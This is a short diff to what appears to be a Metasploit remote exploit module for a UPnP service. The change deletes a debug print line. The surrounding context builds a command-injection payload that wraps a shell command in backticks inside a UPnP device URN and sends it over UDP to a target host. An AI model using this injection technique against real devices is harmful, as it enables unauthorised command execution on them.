@@ -319,7 +319,6 @@ class MetasploitModule < Msf::Exploit::Remote
     else
       payload = "urn:device:1;`#{cmd}`"
     end
-    print_status("payload: #{payload}")
 
     udp_sock = UDPSocket.open
     udp_sock.connect(datastore['RHOST'], datastore['UPNP_PORT'])
